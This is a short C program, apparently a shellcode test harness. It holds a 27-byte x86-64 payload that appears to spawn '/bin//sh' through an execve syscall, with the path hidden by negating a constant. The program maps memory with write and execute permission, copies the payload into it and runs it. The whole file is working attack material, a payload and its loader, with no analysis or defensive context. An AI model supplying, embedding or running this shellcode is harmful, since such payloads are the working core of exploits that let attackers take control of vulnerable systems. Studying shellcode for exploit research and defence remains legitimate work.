
#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

char code[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff"
              "\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

int main() {
  printf("len: %lu bytes\n", strlen(code));

  void *exec_mem = mmap(0, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_ANON | MAP_PRIVATE, -1, 0);

  if (exec_mem == MAP_FAILED) {
    perror("mmap");
    return 1;
  }

  memcpy(exec_mem, code, sizeof(code));

  ((void (*)())exec_mem)();

  return 0;
}
